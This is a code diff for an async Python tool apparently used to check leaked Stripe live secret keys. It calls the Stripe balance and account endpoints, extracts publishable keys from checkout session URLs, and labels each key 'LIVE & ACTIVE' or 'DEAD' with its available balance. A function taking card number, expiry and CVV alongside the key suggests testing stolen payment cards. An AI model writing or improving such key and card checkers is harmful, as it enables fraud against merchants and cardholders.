@@ -8,7 +8,6 @@ import uuid
 import sys
 import httpx
 import base64
-import stripe
 
 def derive_pk_or_acct(sk_key, pk_key=None):
     acct_id = None
@@ -33,17 +32,22 @@ def derive_pk_or_acct(sk_key, pk_key=None):
     derived_pk = pk_key or ('pk_live_' + raw_sk)
     return derived_pk, acct_id
 
-def extract_real_pk_from_sk(sk_key):
+async def extract_real_pk_from_sk(session, sk_key):
+    headers = {'Authorization': f'Bearer {sk_key}'}
+    data = {
+        'payment_method_types[0]': 'card',
+        'line_items[0][price_data][currency]': 'usd',
+        'line_items[0][price_data][product_data][name]': 'Audit',
+        'line_items[0][price_data][unit_amount]': '100',
+        'line_items[0][quantity]': '1',
+        'mode': 'payment',
+        'success_url': 'https://example.com/success',
+        'cancel_url': 'https://example.com/cancel',
+    }
     try:
-        session = stripe.checkout.Session.create(
-            api_key=sk_key,
-            payment_method_types=['card'],
-            line_items=[{'price_data': {'currency': 'usd', 'product_data': {'name': 'Audit'}, 'unit_amount': 100}, 'quantity': 1}],
-            mode='payment',
-            success_url='https://example.com/success',
-            cancel_url='https://example.com/cancel',
-        )
-        checkout_url = session.url
+        resp = await session.post('https://api.stripe.com/v1/checkout/sessions', headers=headers, data=data)
+        json_res = resp.json() if hasattr(resp, 'json') and callable(resp.json) else await resp.json()
+        checkout_url = json_res.get('url', '')
         if '#' in checkout_url:
             url_part = checkout_url.split('#')[1]
             encoded_url = url_part.replace('%2B', '+').replace('%2F', '/')
@@ -71,60 +75,61 @@ async def validate_stripe_sk(sk_key, pk_key=None):
     if not sk_key.startswith('sk_live_'):
         return False, 'Invalid Key Format', None
 
-    real_pk = None
-    if pk_key and pk_key.startswith('pk_live_') and pk_key.replace('pk_live_', '') != sk_key.replace('sk_live_', ''):
-        real_pk = pk_key
-    else:
-        real_pk = extract_real_pk_from_sk(sk_key)
-
-    derived_pk, acct_id = derive_pk_or_acct(sk_key, real_pk)
     headers = {'Authorization': 'Bearer ' + sk_key, 'User-Agent': 'Mozilla/5.0'}
 
     try:
-        async with aiohttp.ClientSession() as session:
-            async with session.get('https://api.stripe.com/v1/balance', headers=headers, timeout=10) as resp:
-                bal_json = await resp.json()
-                if resp.status == 200:
-                    acc_json = {}
-                    try:
-                        async with session.get('https://api.stripe.com/v1/account', headers=headers, timeout=10) as acc_resp:
-                            if acc_resp.status == 200:
-                                acc_json = await acc_resp.json()
-                    except Exception:
-                        pass
+        async with httpx.AsyncClient(timeout=12.0) as session:
+            real_pk = None
+            if pk_key and pk_key.startswith('pk_live_') and pk_key.replace('pk_live_', '') != sk_key.replace('sk_live_', ''):
+                real_pk = pk_key
+            else:
+                real_pk = await extract_real_pk_from_sk(session, sk_key)
 
-                    avail_list = bal_json.get('available', [{}])
-                    pend_list = bal_json.get('pending', [{}])
-                    
-                    avail_item = avail_list[0] if avail_list else {}
-                    pend_item = pend_list[0] if pend_list else {}
+            derived_pk, acct_id = derive_pk_or_acct(sk_key, real_pk)
 
-                    currency = str(avail_item.get('currency', 'usd')).upper()
-                    avail_amt = float(avail_item.get('amount', 0)) / 100.0
-                    pend_amt = float(pend_item.get('amount', 0)) / 100.0
+            resp = await session.get('https://api.stripe.com/v1/balance', headers=headers)
+            bal_json = resp.json()
+            if resp.status_code == 200:
+                acc_json = {}
+                try:
+                    acc_resp = await session.get('https://api.stripe.com/v1/account', headers=headers)
+                    if acc_resp.status_code == 200:
+                        acc_json = acc_resp.json()
+                except Exception:
+                    pass
 
-                    acc_id = acc_json.get('id') or acct_id
-                    country = acc_json.get('country', 'US')
-                    
-                    info = {
-                        'sk': sk_key,
-                        'pk': derived_pk,
-                        'account_id': acc_id,
-                        'country': country,
-                        'currency': currency,
-                        'available': f'{avail_amt:.2f} {currency}',
-                        'pending': f'{pend_amt:.2f} {currency}'
-                    }
-                    return True, 'LIVE & ACTIVE 🟢', info
-                else:
-                    err_msg = (bal_json.get('error') or {}).get('message', 'Expired or Invalid SK Key')
-                    return False, 'DEAD 🔴 (' + err_msg + ')', None
+                avail_list = bal_json.get('available', [{}])
+                pend_list = bal_json.get('pending', [{}])
+                
+                avail_item = avail_list[0] if avail_list else {}
+                pend_item = pend_list[0] if pend_list else {}
+
+                currency = str(avail_item.get('currency', 'usd')).upper()
+                avail_amt = float(avail_item.get('amount', 0)) / 100.0
+                pend_amt = float(pend_item.get('amount', 0)) / 100.0
+
+                acc_id = acc_json.get('id') or acct_id
+                country = acc_json.get('country', 'US')
+                
+                info = {
+                    'sk': sk_key,
+                    'pk': derived_pk,
+                    'account_id': acc_id,
+                    'country': country,
+                    'currency': currency,
+                    'available': f'{avail_amt:.2f} {currency}',
+                    'pending': f'{pend_amt:.2f} {currency}'
+                }
+                return True, 'LIVE & ACTIVE 🟢', info
+            else:
+                err_msg = (bal_json.get('error') or {}).get('message', 'Expired or Invalid SK Key')
+                return False, 'DEAD 🔴 (' + err_msg + ')', None
     except Exception as e:
         return False, 'Error checking key: ' + str(e), None
 
 async def skintoff_engine(session, cc, mm, yy, cvv, sk_key, pk_key):
     if not pk_key or not pk_key.startswith('pk_live_') or pk_key.replace('pk_live_', '') == sk_key.replace('sk_key_', '').replace('sk_live_', ''):
-        extracted = extract_real_pk_from_sk(sk_key)
+        extracted = await extract_real_pk_from_sk(session, sk_key)
         if extracted:
             pk_key = extracted
 
